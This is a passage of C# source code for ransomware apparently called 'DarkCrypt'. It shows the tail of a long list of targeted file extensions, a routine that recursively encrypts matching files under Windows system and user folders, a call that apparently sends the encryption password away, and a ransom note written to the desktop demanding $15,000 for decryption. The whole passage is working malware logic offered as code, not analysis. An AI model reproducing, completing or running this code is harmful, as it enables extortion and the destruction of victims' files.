".taz", ".tb1", ".tb2", ".tbf", ".tbh", ".tbk", ".tbl", ".tbs", ".tbx", ".tc", ".tch", ".tcl", ".tcp", ".tcw", ".td", ".td0", ".td2", ".tdb", ".tdf", ".tdh", ".tdk", ".tds", ".tdt", ".tdw", ".tee", ".tef", ".tel", ".tem", ".temp", ".test", ".tex", ".text", ".tf", ".tfa", ".tfc", ".tfh", ".tfm", ".tfs", ".tfw", ".tg1", ".tga", ".tgz", ".thb", ".thd", ".thm", ".thn", ".ths", ".tib", ".tif", ".tiff", ".til", ".tim", ".tis", ".tix", ".tjl", ".tlb", ".tlc", ".tlp", ".tlt", ".tmb", ".tmd", ".tmf", ".tmo", ".tmp", ".tmpl", ".tmq", ".tms", ".tmv", ".toc", ".tol", ".TOPC", ".tos", ".tp", ".tp3", ".tpb", ".tpf", ".tph", ".tpi", ".tpl", ".tpp", ".tps", ".tpu", ".tpw", ".tpz", ".tr", ".tr2", ".trace", ".trc", ".tre", ".trg", ".tri", ".trk", ".trm", ".trn", ".trp", ".trs", ".trw", ".trx", ".ts", ".tsk", ".tsp", ".tst", ".tsv", ".tt10", ".tta", ".ttc", ".ttf", ".tub", ".tut", ".tv", ".tv1", ".tv2", ".tv3", ".tv4", ".tv5", ".tv6", ".tv7", ".tv8", ".tv9", ".tvf", ".tvo", ".tvp", ".tvr", ".tvt", ".txd", ".txf", ".txi", ".txl", ".txt", ".tym", ".tz", ".tzb", ".uax", ".ub", ".uc2", ".ucn", ".ucs", ".udc", ".udf", ".udl", ".uds", ".ue2", ".ufo", ".uha", ".uhs", ".ui", ".uif", ".uih", ".uis", ".ul", ".uld", ".ult", ".umb", ".umd", ".umf", ".umx", ".uni", ".unl", ".unq", ".uns2", ".unx", ".upd", ".upg", ".upo", ".upx", ".url", ".urls", ".usb", ".user", ".usp", ".usr", ".utf", ".utl", ".utx", ".uu", ".uue", ".uvf", ".uvr", ".uw", ".uwl", ".v", ".v2", ".v64", ".val", ".van", ".var", ".vbc", ".vbd", ".vbe", ".vbn", ".vbp", ".vbs", ".vbw", ".vbx", ".vc", ".vc4", ".vcd", ".vce", ".vcf", ".vch", ".vcmf", ".vcs", ".vcw", ".vcx", ".vda", ".vdb", ".vdf", ".vdi", ".vdj", ".vdm", ".vdr", ".vdx", ".vem", ".ver", ".vew", ".vfm", ".vfn", ".vfp", ".vfs", ".vfx", ".vga", ".vgd", ".vgr", ".vhd", ".vi", ".vic", ".vid", ".vif", ".vik", ".vir", ".vis", ".viv", ".vlm", ".vlt", ".vm", ".vm1", ".vmc", ".vmdk", ".vmf", ".vmg", ".vml", ".vmo", ".vmp", ".vms", ".vmt", ".vmx", ".vnt", ".vo", ".vob", ".voc", ".vof", ".vol", ".vor", ".vox", ".vp6", ".vpa", ".vpd", ".vpg", ".vpk", ".vpl", ".vpp", ".vqe", ".vqf", ".vql", ".vrd", ".vrm", ".vro", ".vrp", ".vrs", ".vs", ".vsd", ".vsl", ".vsm", ".vsp", ".vss", ".vst", ".vtf", ".vts", ".vtx", ".vue", ".vw", ".vw3", ".vwl", ".vwr", ".vwt", ".vxd", ".vyd", ".w", ".w02.w30", ".w31", ".w3g", ".w3m", ".w44", ".w5v", ".wab", ".wac", ".wad", ".waf", ".wal", ".war", ".wav", ".wax", ".wb1", ".wb2", ".wb3", ".wba", ".wbc", ".wbf", ".wbk", ".wbmp", ".wbt", ".wbx", ".wbz", ".wcd", ".wcm", ".wcp", ".wd2", ".wdb", ".wdf", ".wdl", ".web", ".wer", ".wfc", ".wfm", ".wfn", ".wfx", ".wg1", ".wg2", ".wgt", ".wid", ".wim", ".win", ".wiz", ".wjp", ".wk1", ".wk3", ".wk4", ".wkb", ".wke", ".wkq", ".wks", ".wll", ".wlk", ".wlt", ".wma", ".wmc", ".wmf", ".wml", ".wmv", ".wmz", ".wn", ".wnf", ".wo4", ".wo7", ".woa", ".woc", ".wor", ".wot", ".wow", ".wp", ".wp3", ".wp5", ".wpd", ".wpf", ".wpg", ".wpj", ".wpk", ".wpm", ".wps", ".wpt", ".wpw", ".wq!", ".wq1", ".wr1", ".wrd", ".wrf", ".wri", ".wrk", ".wrl", ".wrml", ".wrp", ".wrs", ".ws", ".wsf", ".wss", ".ws2", ".wsc", ".wsd", ".wsf", ".wsh", ".wsp", ".wsr", ".wss", ".wst", ".wsx", ".wsz", ".wtd", ".wtr", ".wv", ".wve", ".wvx", ".wvw", ".wwb", ".wwk", ".wwp", ".wws", ".wwv", ".wxp", ".wxs", ".wzg", ".wzs", ".x", ".x01", ".x02", ".x03", ".x04", ".x05", ".x06", ".x07", ".x08", ".x09", ".x16", ".x32", ".xap", ".xbel", ".xbm", ".xcf", ".xdf", ".xdw", ".xef", ".xem", ".xep", ".xes", ".xet", ".xev", ".xez", ".xfd", ".xfdl", ".xfn", ".xft", ".xfx", ".xhtml", ".xi", ".xif", ".xla", ".xla", ".xlb", ".xlc", ".xlk", ".xll", ".xlm", ".xlr", ".xls", ".xlsm", ".xlsx", ".xlt", ".xlw", ".xlx", ".xm", ".xmi", ".xml", ".xmp", ".xnf", ".xpi", ".xnk", ".xpl", ".xpm", ".xpr", ".xps", ".xpt", ".xpw", ".xqt", ".xpv", ".xrf", ".xsd", ".xsf", ".xsl", ".xspf", ".xss", ".xtb", ".xtm", ".xtr", ".xul", ".xvb", ".xvid", ".xvl", ".xwd", ".Tool)", ".xwk", ".xwp", ".xx", ".xxe", ".xxx", ".xy", ".xy3", ".xyw", ".xyz", ".xz", ".y", ".y01", ".y02", ".y03", ".y04", ".y05", ".y06", ".y07", ".y08", ".y09", ".yab", ".yal", ".ybk", ".ychat", ".yenc", ".ymg", ".yml", ".ync", ".yps", ".yuv", ".yz", ".yz1", ".z", ".z01", ".z02", ".z1", ".z3", ".zap", ".zbd", ".zdb", ".zdb", ".zdct", ".zdg", ".zdl", ".zdp", ".zer", ".zfx", ".zgm", ".zhtml", ".zi", ".zif", ".zip", ".zipx", ".zix", ".zl?", ".zl", ".zls", ".zmc", ".zom", ".zon", ".zoo", ".zpk", ".zpl", ".zst", ".ztd", ".zvd", ".zvz", ".zxp", ".zz", ".zzt"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],password);
            }
            
            
        }

        public void startAction()
        {
            string password = CreatePassword(15);
            string path_1 = "C:\\";
            string startPath_1 = userDir + path_1 + userName + "\\PerfLogs";
            string startPath_5 = userDir + path_1 + userName + "\\Program Files";
            string startPath_6 = userDir + path_1 + userName + "\\Program Files (x86)";
            string startPath_7 = userDir + path_1 + userName + "\\ProgramData";
            string startPath_8 = userDir + path_1 + userName + "\\Users";
            string startPath_13 = userDir + path_1 + userName + "\\Windows";
            encryptDirectory(startPath_1, password);
            encryptDirectory(startPath_5, password);
            encryptDirectory(startPath_6, password);
            encryptDirectory(startPath_7, password);
            encryptDirectory(startPath_8, password);
            encryptDirectory(startPath_13, password);
            SendPassword(password);
            encryptDirectory(startPath,password);
            messageCreator();
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\DarkCrypt_Massage.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "ATTENTION!", "Don't Worry Friends, You Can Restore All Your Files!", "All Your Files Like Photos, Databases, Documents, And Other Important Things Are Encrypted With The Strongest Encryption And Unique Key.", "The Only Method To Recover Files Is By Purchasing A Decryption Tool And Unique Key For You.", " This Software Will Decrypt All Your Encrypted Files.", "The price of the private key and decryption software is $15.000.", " Available If You Contact Us The First 24 Hours.", "Please Note That You Will Never Recover Your Data Without Payment.", " Check Your Email "Spam" Folder If You Don't Get a Answer in More Than 3 Hours.", "In Order To Get This Software, You Need To Write In Our Email:", "Your Email", " Message Email Address To Contact Us:", "Your Email" };
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
